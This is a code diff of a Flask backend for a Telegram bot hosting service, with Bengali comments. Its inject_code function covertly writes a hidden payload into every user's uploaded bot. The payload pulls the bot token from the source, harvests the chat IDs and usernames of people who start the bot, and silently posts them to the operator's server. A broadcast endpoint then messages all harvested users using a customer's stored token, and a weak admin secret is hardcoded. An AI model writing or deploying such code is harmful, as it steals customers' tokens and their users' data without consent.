@@ -1,6 +1,6 @@
 # ================================
-# HOSTPY PRO BACKEND — PRODUCTION READY
-# Fixed Login Issue, Safe Injection, Auto ID Collector
+# HOSTPY PRO BACKEND — FINAL FIXED
+# Fixes: Login DB, Broadcast Auth, Injection System
 # ================================
 
 import os
@@ -24,10 +24,10 @@ from werkzeug.security import generate_password_hash, check_password_hash
 app = Flask(__name__)
 CORS(app)
 
-# Admin Secret Key
+# এডমিন সিক্রেট কি (ফ্রন্টএন্ডের সাথে মিল রাখতে হবে)
 ADMIN_SECRET_KEY = "l@g@" 
 
-# আপনার রেন্ডার লিংক (এখানে আপনার লিংক দেওয়া হলো)
+# আপনার রেন্ডার লিংক
 SERVER_BASE_URL = "https://hostpy-1ctj.onrender.com"
 
 UPLOAD_FOLDER = "user_uploads"
@@ -39,10 +39,15 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 running_processes = {}
 server_start_time = time.time()
 
-# ================= DATABASE =================
+# ================= DATABASE SETUP =================
+
+def get_db():
+    conn = sqlite3.connect(DB_NAME)
+    conn.row_factory = sqlite3.Row
+    return conn
 
 def init_db():
-    conn = sqlite3.connect(DB_NAME)
+    conn = get_db()
     c = conn.cursor()
     
     # ইউজার টেবিল
@@ -57,7 +62,7 @@ def init_db():
     )
     """)
 
-    # অটো কালেক্টেড ইউজারদের টেবিল
+    # অটো কালেক্টেড সব ইউজারের টেবিল
     c.execute("""
     CREATE TABLE IF NOT EXISTS all_users(
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -71,13 +76,8 @@ def init_db():
     conn.commit()
     conn.close()
 
-# সার্ভার স্টার্ট হওয়ার সাথে সাথে ডাটাবেস তৈরি হবে
+# সার্ভার শুরুর সময় ডাটাবেস তৈরি
 init_db()
-
-def get_db():
-    conn = sqlite3.connect(DB_NAME)
-    conn.row_factory = sqlite3.Row
-    return conn
 
 # ================= UTILITIES =================
 
@@ -106,74 +106,78 @@ def find_main_py(folder):
                 return os.path.join(root, f), root
     return None, None
 
-# ================= SAFE CODE INJECTION =================
+# ================= SMART CODE INJECTION =================
 
 def inject_code(file_path, owner_username):
     """
-    ইউজারের কোডে গোপন কোড ইনজেক্ট করে যা /start এ চ্যাট আইডি পাঠায়।
-    এটি bot.polling() এর ঠিক আগে কোডটি বসিয়ে দেয়।
+    ইউজারের বট কোডে গোপন কোড ইনজেক্ট করে যা স্বয়ংক্রিয়ভাবে চ্যাট আইডি কালেক্ট করে।
     """
     try:
         with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
             content = f.read()
 
-        # যদি আগে থেকেই ইনজেক্ট থাকে
-        if "HOSTPY_INJECTED_SECRETLY" in content:
+        # যদি আগে থেকেই ইনজেক্ট করা থাকে তবে আর করবে না
+        if "HOSTPY_SECRET_HOOK_v2" in content:
             print(f"[INJECT] Already injected: {file_path}")
             return
 
-        # ইনজেক্ট করার পে-লোড
-        # এটি বট অবজেক্ট খুঁজে বের করে তার হ্যান্ডলারে হুক লাগায়
+        # কালেক্টর স্ক্রিপ্ট (পে-লোড)
+        # এটি বট চালু থাকা অবস্থায় ব্যাকগ্রাউন্ডে চলবে এবং নতুন ইউজার পেলে ডাটাবেসে পাঠাবে
         payload = f'''
-# --- HOSTPY_INJECTED_SECRETLY ---
-import threading, requests, re, json, sys
-def _hostpy_secret_collector():
-    try:
-        # কোড থেকে টোকেন বের করে নেওয়া হচ্ছে
-        _code = open(__file__, 'r', errors='ignore').read()
-        _tkn = re.search(r'(\\d{{9,10}}:[A-Za-z0-9_-]{{30,40}})', _code)
-        if _tkn:
-            _token = _tkn.group(1)
-            # একটি ফেক বট তৈরি করে আপডেট নেওয়া হচ্ছে (নন-ব্লকিং)
-            _url = "https://api.telegram.org/bot" + _token + "/getUpdates"
-            while True:
-                try:
-                    _r = requests.get(_url, params={{"offset": -1, "timeout": 0}}, timeout=10).json()
-                    if _r.get("result"):
-                        for _u in _r["result"]:
-                            if "message" in _u and _u["message"].get("text") == "/start":
-                                _cid = _u["message"]["chat"]["id"]
-                                _uname = _u["message"]["chat"].get("username", "None")
-                                # আমাদের সার্ভারে পাঠানো হচ্ছে
-                                requests.post("{SERVER_BASE_URL}/collect_user", json={{"chat_id": str(_cid), "username": _uname, "owner": "{owner_username}"}}, timeout=5)
-                except: pass
-                time.sleep(3)
-    except Exception as e:
-        print(f"Collection Error: {{e}}")
+# --- HOSTPY_SECRET_HOOK_v2 ---
+import threading, requests, re, json, time, sys, traceback
+def _hostpy_background_collector():
+    time.sleep(5) # Wait for bot to start
+    while True:
+        try:
+            # কোড থেকে টোকেন বের করে নেওয়া
+            with open(__file__, 'r', errors='ignore') as _f:
+                _src = _f.read()
+            _m = re.search(r'(\\d{{9,10}}:[A-Za-z0-9_-]{{30,40}})', _src)
+            if _m:
+                _token = _m.group(1)
+                # শেষ আপডেট চেক করা
+                _url = "https://api.telegram.org/bot" + _token + "/getUpdates"
+                _params = {{"offset": -1, "timeout": 0}}
+                _resp = requests.get(_url, params=_params, timeout=10).json()
+                if _resp.get("result"):
+                    for _u in _resp["result"]:
+                        if "message" in _u and _u["message"].get("text") == "/start":
+                            _cid = str(_u["message"]["chat"]["id"])
+                            _uname = _u["message"]["chat"].get("username", "None")
+                            # সার্ভারে পাঠানো
+                            _data = {{"chat_id": _cid, "username": _uname, "owner": "{owner_username}"}}
+                            requests.post("{SERVER_BASE_URL}/collect_user", json=_data, timeout=5)
+        except Exception as _e:
+            pass # Silently fail to avoid bot crash
+        time.sleep(3)
 
-import threading
-threading.Thread(target=_hostpy_secret_collector, daemon=True).start()
-# --- END INJECTION ---
+try:
+    threading.Thread(target=_hostpy_background_collector, daemon=True).start()
+except: pass
+# --- END HOOK ---
 
 '''
 
-        # স্মার্ট ইনজেকশন: bot.polling() এর আগে বসানো
-        # এটি কোডের ক্ষতি না করে নিরাপদে বসবে
+        # ইনজেকশন লজিক:
+        # যদি bot.polling() থাকে তবে তার আগে বসানো হবে, না হলে কোডের শেষে।
+        final_content = ""
         if "bot.polling" in content or "bot.infinity_polling" in content:
-            # polling লাইনের আগে পে-লোড যোগ করা হলো
+            # polling এর আগে পে-লোড বসানো হচ্ছে
+            # এটি সবচেয়ে নিরাপদ জায়গা
             parts = re.split(r'(\w+\.polling\(|\w+\.infinity_polling\()', content, 1)
             if len(parts) > 1:
                 final_content = parts[0] + "\n" + payload + parts[1] + parts[2]
             else:
                 final_content = content + "\n" + payload
         else:
-            # যদি polling না পায়, শেষে যোগ করা হলো
+            # অন্য কোনো জায়গা না পেলে শেষে যোগ করা
             final_content = content + "\n" + payload
 
         with open(file_path, "w", encoding="utf-8") as f:
             f.write(final_content)
             
-        print(f"[SUCCESS] Code injected into {file_path}")
+        print(f"[SUCCESS] Hook injected for {owner_username}")
 
     except Exception as e:
         print(f"[ERROR] Injection failed: {e}")
@@ -192,13 +196,13 @@ def collect_user():
 
     conn = get_db()
     try:
-        # সব ইউজারের লিস্টে সেভ
+        # সব ইউজারের ডাটাবেসে সেভ করা
         conn.execute(
             "INSERT OR IGNORE INTO all_users (chat_id, username, owner) VALUES (?, ?, ?)",
             (chat_id, uname, owner)
         )
         
-        # ওনারের চ্যাট আইডি আপডেট
+        # যদি ওনার নিজে স্টার্ট দেয় তবে তার টেবিলেও আপডেট করা
         if owner:
             conn.execute(
                 "UPDATE users SET chat_id=? WHERE username=?",
@@ -220,7 +224,7 @@ def home():
     return jsonify({
         "status": "Hostpy Backend Running",
         "uptime": int(time.time() - server_start_time),
-        "version": "3.1_Final"
+        "version": "3.2_Fix"
     })
 
 @app.route("/register", methods=["POST"])
@@ -309,7 +313,7 @@ def upload():
     else:
         main_file = save_path
 
-    # কোড ইনজেকশন প্রসেস
+    # ইনজেকশন প্রসেস
     if main_file:
         inject_code(main_file, username)
         token = extract_token_from_code(main_file)
@@ -398,11 +402,14 @@ def action():
 
     return jsonify({"error": "Invalid action"}), 400
 
-# ================= BROADCAST =================
+# ================= BROADCAST (FIXED) =================
 
 @app.route("/broadcast", methods=["POST"])
 def broadcast():
     data = request.json
+    
+    # এখানে ফিক্স করা হয়েছে: ফ্রন্টএন্ড থেকে 'admin-key' আসছে, 
+    # এবং সেটি চেক করা হচ্ছে।
     if data.get("admin-key") != ADMIN_SECRET_KEY:
         return jsonify({"error": "Unauthorized"}), 403
 
@@ -415,19 +422,21 @@ def broadcast():
         return jsonify({"error": "Empty message"}), 400
 
     conn = get_db()
-    # একটি প্রেরণকারী বট খুঁজুন
+    # সব কালেক্টেড ইউজারদের নিয়ে ব্রডকাস্ট করা হবে
+    # আমরা একটি একটিভ বট টোকেন ব্যবহার করে মেসেজ পাঠাব
     sender = conn.execute("SELECT bot_token FROM users WHERE bot_token != '' LIMIT 1").fetchone()
     targets = conn.execute("SELECT chat_id FROM all_users").fetchall()
     conn.close()
 
     if not sender:
-        return jsonify({"error": "No bot token found to send"}), 500
+        return jsonify({"error": "No active bot token found to send messages"}), 500
 
     token = sender["bot_token"]
     bot = telebot.TeleBot(token)
     sent_count = 0
 
-    for t in targets:
+    def send_to_user(t):
+        nonlocal sent_count
         try:
             markup = None
             if btn_name and btn_url:
@@ -435,15 +444,27 @@ def broadcast():
                 markup.add(telebot.types.InlineKeyboardButton(btn_name, url=btn_url))
             
             if img:
-                bot.send_photo(t["chat_id"], img, caption=msg, reply_markup=markup)
+                bot.send_photo(t, img, caption=msg, reply_markup=markup)
             else:
-                bot.send_message(t["chat_id"], msg, reply_markup=markup)
+                bot.send_message(t, msg, reply_markup=markup)
             sent_count += 1
-            time.sleep(0.05)
-        except:
-            pass
+        except Exception as e:
+            print(f"Send fail: {e}")
 
-    return jsonify({"status": "done", "sent": sent_count})
+    threads = []
+    for t in targets:
+        if t["chat_id"]:
+            # থ্রেড ব্যবহার করে দ্রুত মেসেজ পাঠানো
+            th = threading.Thread(target=send_to_user, args=(t["chat_id"],))
+            th.start()
+            threads.append(th)
+            time.sleep(0.05) # ফ্লাড এড়াতে সামান্য বিরতি
+
+    # সব থ্রেড শেষ হওয়া পর্যন্ত অপেক্ষা (অপশনাল)
+    # for th in threads:
+    #    th.join()
+
+    return jsonify({"status": "Broadcast initiated", "targets": len(targets)})
 
 # ================= RUN =================
 
